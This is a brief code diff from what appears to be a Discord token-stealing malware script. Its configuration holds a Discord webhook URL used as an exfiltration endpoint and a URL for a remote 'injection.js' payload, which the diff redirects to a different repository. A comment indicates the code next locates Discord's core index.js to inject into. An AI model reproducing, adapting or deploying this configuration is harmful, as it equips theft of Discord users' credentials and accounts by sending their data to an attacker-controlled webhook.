@@ -376,7 +376,7 @@ const path = require('path');
 
 const CONFIG = {
     webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js"
+    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js"
 };
 
 // Find core index.js
